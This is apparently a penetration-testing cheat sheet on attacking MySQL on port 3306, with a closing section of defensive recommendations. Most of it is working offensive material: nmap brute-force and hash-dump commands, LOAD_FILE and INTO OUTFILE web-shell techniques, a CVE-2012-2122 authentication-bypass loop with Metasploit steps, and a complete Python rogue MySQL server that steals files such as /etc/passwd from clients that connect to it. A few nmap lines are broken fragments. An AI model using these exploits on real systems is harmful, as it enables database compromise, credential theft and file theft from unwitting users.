## Overview

::card
---
icon: i-lucide-info
title: What is Port 3306?
---
**MySQL** is the world's most popular open-source relational database management system (RDBMS), operating on **TCP port 3306** by default. It powers millions of web applications — WordPress, Joomla, Drupal, phpMyAdmin, custom apps — and stores **the most valuable asset in any organization: data**. MySQL is also the backbone of the **LAMP/LEMP stack** (Linux, Apache/Nginx, MySQL, PHP). MariaDB, a MySQL fork, also uses port 3306 by default. Attackers targeting this port aim for **credential theft, data exfiltration, privilege escalation, and remote code execution**.
::

::callout
---
icon: i-lucide-skull
color: red
---
A compromised MySQL server means **total data breach** — usernames, passwords, personal data, financial records, API keys, and application secrets. With sufficient privileges, MySQL can also be leveraged for **file read/write on the OS** and even **remote code execution** via UDF injection.
::

## Enumeration

### Nmap NSE Scripts

::note
Nmap ships with **multiple MySQL-specific NSE scripts**. These are essential for initial enumeration before connecting with a MySQL client.
::

::code-group
```bash [All MySQL Scripts]
# Run ALL MySQL scripts
nmap -p 3306 --script="mysql-*" <TARGET_IP>

# Safe enumeration combo
nmap -p 3306 --script="mysql-info,mysql-enum,mysql-databases,\
mysql-variables,mysql-users,mysql-audit" <TARGET_IP>
```

```bash [Information Gathering]
# MySQL server info (no auth needed)
nmap -p 3306 --script=mysql-info <TARGET_IP>

# MySQL enumeration (capabilities, salt, version)
nmap -p 3306 --script=mysql-enum <TARGET_IP>
```

```bash [Credential Attacks]
# MySQL brute force
nmap -p 3306 --script=mysql-brute \
  --script-args userdb=users.txt,passdb=passwords.txt <TARGET_IP>

# Empty password check
nmap -p 3306 --script=mysql-empty-password <TARGET_IP>
```

```bash [Post-Auth Enumeration]
# List databases (requires creds)
nmap -p 3306 --script=mysql-databases \
  --script-args mysqluser=root,mysqlpass=password <TARGET_IP>

# List users
nmap -p 3306 --script=mysql-users \
  --script-args mysqluser=root,mysqlpass=password <TARGET_IP>

# Server variables
nmap -p 3306 --script=mysql-variables \
  --script-args mysqluser=root,mysqlpass=password <TARGET_IP>

  --script-args "mysql-audit.username=root,mysql-audit.password=password,\

nmap -p 3306 --script=mysql-query \

nmap -p 3306 --script=mysql-dump-hashes \
  --script-args "username=root,password=password" <TARGET_IP>
```

## Weakness Analysis

### Core Vulnerabilities

::card-group
  ::card
  ---
  icon: i-lucide-lock-open
  title: "1. Weak / Default Credentials"
  color: red
  ---
  Blank root passwords, default application credentials, and weak passwords are the **#1 attack vector**. MySQL historically allowed blank root passwords on fresh installs.
  ::

  ::card
  ---
  icon: i-lucide-globe
  title: "2. Network Exposure"
  color: red
  ---
  MySQL bound to **0.0.0.0** instead of localhost. Directly accessible from the internet. No firewall rules restricting access to trusted IPs only.
  ::

  ::card
  ---
  icon: i-lucide-file-code
  title: "3. FILE Privilege Abuse"
  color: red
  ---
  Users with `FILE` privilege can **read any file** the MySQL process can access (`LOAD_FILE()`) and **write files** to the filesystem (`INTO OUTFILE`). Web shell upload path.
  ::

  ::card
  ---
  icon: i-lucide-terminal
  title: "4. UDF Code Execution"
  color: red
  ---
  With sufficient privileges, attackers can create **User Defined Functions** by writing shared libraries to the plugin directory — achieving **arbitrary OS command execution**.
  ::

  ::card
  ---
  icon: i-lucide-shield-off
  title: "5. No Encryption (Default)"
  color: orange
  ---
  MySQL traffic is **unencrypted by default**. Credentials and query data are transmitted in cleartext unless SSL/TLS is explicitly configured.
  ::

  ::card
  ---
  icon: i-lucide-syringe
  title: "6. SQL Injection Gateway"
  color: red
  ---
  Web applications using MySQL are prime targets for **SQL injection**. Successful SQLi provides direct access to the database — reading, modifying, or deleting all data.
  ::
::

### Detailed Attack Surface

::field-group
  ::field{name="Blank Root Password" type="Critical"}
  MySQL < 5.7 and MariaDB installations often have no root password set. Direct root access without any authentication.
  ::

  ::field{name="Remote Root Login Allowed" type="Critical"}
  `root@%` user configured instead of `root@localhost`. Root can authenticate from any IP address.
  ::

  ::field{name="FILE Privilege → File Read" type="Critical"}
  `SELECT LOAD_FILE('/etc/passwd')` reads arbitrary system files. Can extract SSH keys, web configs, shadow files (if MySQL runs as root).
  ::

  ::field{name="FILE Privilege → File Write" type="Critical"}
  `SELECT ... INTO OUTFILE '/var/www/html/shell.php'` writes web shells to the web root. Direct path to RCE on web servers.
  ::

  ::field{name="UDF Injection → OS RCE" type="Critical"}
  Write a shared object (`.so`/`.dll`) to the plugin directory, create a UDF, and execute arbitrary system commands as the MySQL service user.
  ::

  ::field{name="Password Hash Extraction" type="High"}
  Dump `mysql.user` table to obtain all password hashes. Crack offline with Hashcat/John. MySQL uses `mysql_native_password` (SHA1-based) which is fast to crack.
  ::

  ::field{name="Cleartext Traffic Sniffing" type="High"}
  Without SSL/TLS, all MySQL traffic (credentials, queries, results) is visible to any attacker on the same network segment.
  ::

  ::field{name="General Log Poisoning" type="High"}
  Enable general log, set log file to web root, inject PHP code via SQL query — code gets written to log file and executed by web server.
  ::

  ::field{name="Insecure Backup Files" type="High"}
  MySQL dumps (`.sql` files) left in web-accessible directories. Contain full database contents including credentials.
  ::

  ::field{name="LOAD DATA LOCAL INFILE" type="High"}
  Client-side file read vulnerability. Rogue MySQL server can trick a connecting client into sending any local file. Affects any MySQL client that has `local_infile` enabled.
  ::

  ::field{name="Privilege Escalation" type="High"}
  Users with `GRANT` option can escalate privileges. Users with `CREATE` privilege on `mysql` database can modify user table directly.
  ::

  ::field{name="Denial of Service" type="Medium"}
  Slowloris-style attacks on MySQL connections. Connection exhaustion. Heavy query execution causing resource starvation.
  ::
::

## Common CVEs

::caution
The following CVEs represent **critical, actively exploited** vulnerabilities in MySQL and MariaDB. Many remain unpatched on legacy and poorly maintained systems.

### Critical CVEs

::accordion
  :::accordion-item
  ---
  icon: i-lucide-alert-triangle
  label: "CVE-2012-2122 — MySQL Authentication Bypass"
  ---

  | Field | Detail |
  |-------|--------|
  | **CVSS** | **7.5 High** |
  | **Affected** | MySQL 5.1.x, 5.5.x, 5.6.x; MariaDB 5.1.x, 5.2.x, 5.3.x (certain builds) |
  | **Type** | Authentication Bypass (Race Condition) |
  | **Vector** | Due to casting error, ~1 in 256 login attempts with wrong password succeeds |
  | **Impact** | Bypass authentication and gain full MySQL access |

  ```bash [Exploitation]
  # ─── DETECTION ───
  nmap -p 3306 --script=mysql-vuln-cve2012-2122 <TARGET_IP>

  # ─── EXPLOITATION ───
  # Brute force with any password — ~1/256 chance of success per attempt
  for i in $(seq 1 1000); do
    mysql -h <TARGET_IP> -u root --password=bad_password 2>/dev/null
  done

  # Faster with bash loop
  for i in $(seq 1 300); do
    mysql -u root --password=wrong -h <TARGET_IP> \
      -e "SELECT VERSION();" 2>/dev/null && break
  done

  # Python exploit
  python2 mysql_auth_bypass.py <TARGET_IP>

  # Metasploit
  use auxiliary/scanner/mysql/mysql_authbypass_hashdump
  set RHOSTS <TARGET_IP>
  run
  ```

  ::tip
  This vulnerability depends on the **memcmp implementation** in the compiled C library. Not all builds are vulnerable — `glibc` on certain Linux distributions (Ubuntu 64-bit) is commonly affected.
  ::
  :::

## MySQL Client-Side Attacks

::accordion
  :::accordion-item
  ---
  icon: i-lucide-shield-alert
  label: "LOAD DATA LOCAL INFILE Attack"
  ---

  ```text
  Attack Flow:
  ─────────────────────────────────────────
  1. Attacker sets up rogue MySQL server
  2. Victim connects to rogue server (via social engineering, 
     misconfigured app, or credential re-use)
  3. Rogue server responds to any query with a 
     LOCAL INFILE request
  4. Client reads the requested file and sends it to server
  5. Attacker captures the file contents
  
  Files that can be stolen:
  - /etc/passwd, /etc/shadow
  - ~/.ssh/id_rsa
  - /var/www/html/wp-config.php
  - /var/www/html/.env
  - C:\Users\<user>\Desktop\*.txt
  - Any file readable by the MySQL client process
  ```

  ```python [rogue_mysql_server.py]
  #!/usr/bin/env python3
  """Rogue MySQL Server - LOAD DATA LOCAL INFILE"""
  import socket
  import struct

  TARGET_FILE = "/etc/passwd"
  LISTEN_PORT = 3306

  def create_greeting():
      """MySQL server greeting packet"""
      data = b'\x0a'                     # Protocol version
      data += b'5.7.99-rogue\x00'        # Server version
      data += struct.pack('<I', 1)        # Thread ID
      data += b'AAAAAAAA'                # Auth plugin data part 1
      data += b'\x00'                    # Filler
      data += struct.pack('<H', 0xffff)  # Capability flags
      data += b'\x21'                    # Character set
      data += struct.pack('<H', 0x0002)  # Status flags
      data += struct.pack('<H', 0x8000)  # Extended capabilities
      data += b'\x15'                    # Auth plugin data length
      data += b'\x00' * 10              # Reserved
      data += b'BBBBBBBBBBBB\x00'       # Auth plugin data part 2
      data += b'mysql_native_password\x00'
      
      # Wrap in MySQL packet
      length = struct.pack('<I', len(data))[:3]
      return length + b'\x00' + data

  def create_ok():
      """OK response packet"""
      data = b'\x00\x00\x00\x02\x00\x00\x00'
      length = struct.pack('<I', len(data))[:3]
      return length + b'\x02' + data

  def create_local_infile_request(filename):
      """Request client to send local file"""
      data = b'\xfb' + filename.encode()
      length = struct.pack('<I', len(data))[:3]
      return length + b'\x01' + data

  def main():
      server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      server.bind(('0.0.0.0', LISTEN_PORT))
      server.listen(1)
      print(f"[*] Rogue MySQL listening on port {LISTEN_PORT}")
      print(f"[*] Will request: {TARGET_FILE}")
      
      while True:
          conn, addr = server.accept()
          print(f"[+] Connection from {addr}")
          
          conn.send(create_greeting())
          conn.recv(1024)  # Client auth
          conn.send(create_ok())
          conn.recv(1024)  # Client query
          conn.send(create_local_infile_request(TARGET_FILE))
          
          file_data = conn.recv(65536)
          if len(file_data) > 4:
              print(f"[+] Received file contents:")
              print(file_data[4:].decode('utf-8', errors='ignore'))
          
          conn.close()

  if __name__ == "__main__":
      main()
  ```

## Defense & Remediation

::tip
Provide these **remediation recommendations** in your pentest report for MySQL findings.
::

::card-group
  ::card
  ---
  icon: i-lucide-lock
  title: "Strong Authentication"
  color: green
  ---
  Set **strong, unique passwords** for all MySQL accounts. Remove blank passwords. Use `caching_sha2_password` plugin (MySQL 8.0+). Implement account lockout.
  ::

  ::card
  ---
  icon: i-lucide-shield-check
  title: "Network Restrictions"
  color: green
  ---
  Bind MySQL to **127.0.0.1** or specific internal IPs. Use firewall rules to restrict port 3306 access. **Never expose MySQL directly to the internet.**
  ::

  ::card
  ---
  icon: i-lucide-user-x
  title: "Least Privilege"
  color: green
  ---
  Remove **FILE, SUPER, PROCESS** privileges from application users. Create dedicated accounts per application with minimal required privileges. Remove `root@%`.
  ::

  ::card
  ---
  icon: i-lucide-key-round
  title: "Encryption (SSL/TLS)"
  color: green
  ---
  Enable **SSL/TLS** for all MySQL connections. Set `require_secure_transport=ON`. Use valid certificates. Encrypt replication traffic.
  ::

  ::card
  ---
  icon: i-lucide-file-lock
  title: "Restrict File Operations"
  color: green
  ---
  Set `secure_file_priv` to a **specific directory** or `NULL` to disable file operations entirely. Disable `local_infile` globally.
  ::

  ::card
  ---
  icon: i-lucide-refresh-cw
  title: "Patch & Update"
  color: green
  ---
  Keep MySQL/MariaDB **updated** to the latest stable release. Subscribe to Oracle/MariaDB security advisories. Apply critical patches immediately.
  ::
::

::card-group
  ::card
  ---
  icon: i-lucide-eye
  title: "Audit & Monitoring"
  color: green
  ---
  Enable MySQL **audit logging**. Monitor for failed login attempts, privilege escalation, file operations, and UDF creation. Integrate with SIEM.
  ::

  ::card
  ---
  icon: i-lucide-database
  title: "Secure Configuration"
  color: green
  ---
  Run `mysql_secure_installation`. Remove test databases. Disable `--skip-grant-tables`. Set `sql_mode` to strict. Disable `LOAD DATA LOCAL INFILE`.
  ::

  ::card
  ---
  icon: i-lucide-shield
  title: "Prepared Statements"
  color: green
  ---
  Use **parameterized queries / prepared statements** in all application code. Never concatenate user input into SQL queries. Use ORM frameworks.
  ::

  ::card
  ---
  icon: i-lucide-scan-eye
  title: "phpMyAdmin Security"
  color: green
  ---
  **Remove phpMyAdmin from production.** If required, restrict access by IP, use strong auth, enable HTTPS, rename default path, and keep updated.
  ::
